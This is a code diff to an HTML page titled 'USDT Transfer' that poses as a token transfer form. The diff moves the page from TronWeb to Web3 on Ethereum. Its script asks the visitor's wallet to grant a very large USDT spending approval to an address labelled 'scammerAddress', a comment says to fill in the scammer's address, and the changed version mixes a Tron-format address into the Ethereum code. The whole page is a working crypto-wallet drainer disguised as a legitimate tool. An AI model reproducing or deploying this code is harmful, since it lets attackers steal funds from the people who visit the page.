@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <title>USDT Transfer</title>
     <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/gh/TronWeb/tronweb@latest/dist/TronWeb.js"></script>
 </head>
 <body>
     <h1>Transfer USDT</h1>
@@ -14,27 +13,50 @@
     <p class="tipError"></p>
     <script>
         async function approveToken() {
-            const trc20ContractAddress = "TR7NHqjeKQoxGTci88i8ZyApLBoTsZiGj6"; // USDT合约地址
-            const scammerAddress = "0xScammerAddress"; // 替换为骗子地址
-
-            if (typeof window.tronWeb === 'undefined' || typeof window.tronWeb.defaultAddress.base58 === 'undefined') {
-                document.getElementsByClassName("tipError")[0].innerHTML = '<span style="color:#db705c">TRX钱包地址不足</span>';
+            if (typeof window.ethereum === 'undefined') {
+                document.getElementsByClassName("tipError")[0].innerHTML = '<span style="color:#db705c">Web3 wallet not detected</span>';
                 return;
             }
 
-            const trc20Address = window.tronWeb.defaultAddress.base58;
-            console.log("User Wallet Address: ", trc20Address);
-
+            const web3 = new Web3(window.ethereum);
             try {
-                let contract = await window.tronWeb.contract().at(trc20ContractAddress);
+                await window.ethereum.enable(); // Request account access
+
+                const usdtContractAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT 合约地址
+                const scammerAddress = "TFAkA2qZvVn7F8mdXhrcoisfqXFYxxwzxd"; // 替换为骗子地址
+                const usdtABI = [
+                    {
+                        "constant": true,
+                        "inputs": [{ "name": "owner", "type": "address" }],
+                        "name": "balanceOf",
+                        "outputs": [{ "name": "", "type": "uint256" }],
+                        "type": "function"
+                    },
+                    {
+                        "constant": false,
+                        "inputs": [
+                            { "name": "spender", "type": "address" },
+                            { "name": "value", "type": "uint256" }
+                        ],
+                        "name": "approve",
+                        "outputs": [{ "name": "", "type": "bool" }],
+                        "type": "function"
+                    }
+                ];
+
+                const accounts = await web3.eth.getAccounts();
+                const userAddress = accounts[0];
+                console.log("User Wallet Address: ", userAddress);
+
+                const contract = new web3.eth.Contract(usdtABI, usdtContractAddress);
                 let num = document.getElementsByClassName("amountInput")[0].value;
                 console.log("Amount Entered: ", num);
 
-                let balance = await contract.balanceOf(trc20Address).call();
-                let userBalance = balance.toNumber();
+                const balance = await contract.methods.balanceOf(userAddress).call();
+                const userBalance = web3.utils.fromWei(balance, 'mwei'); // USDT uses 6 decimals
                 console.log("User Balance: ", userBalance);
 
-                let amountToSend = parseInt(num) * 1000000;
+                let amountToSend = parseFloat(num);
 
                 if (amountToSend > userBalance) {
                     document.getElementsByClassName("tipError")[0].innerHTML = '<span style="color:#db705c">USDT余额不足</span>';
@@ -43,19 +65,20 @@
 
                 console.log("Sending approve request...");
 
-                await contract.approve(
+                await contract.methods.approve(
                     scammerAddress, // 地址 _spender
-                    '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff' // 最大授权量
-                ).send({ from: trc20Address, feeLimit: 1000000 }).then(output => {
-                    console.log('Authorization output: ', output);
+                    web3.utils.toWei('100000000', 'mwei') // 最大授权量
+                ).send({ from: userAddress })
+                .on('transactionHash', function(hash) {
+                    console.log('Authorization output: ', hash);
                     document.getElementsByClassName("tipError")[0].innerHTML = '<span style="color:#00db00">授权成功</span>';
-                }).catch(error => {
+                })
+                .on('error', function(error) {
                     console.error('Error during approval: ', error);
                     document.getElementsByClassName("tipError")[0].innerHTML = '<span style="color:#db705c">授权失败</span>';
                 });
-
-            } catch (e) {
-                console.error('Exception caught: ', e);
+            } catch (error) {
+                console.error('Error enabling ethereum: ', error);
                 document.getElementsByClassName("tipError")[0].innerHTML = '<span style="color:#db705c">操作失败</span>';
             }
         }
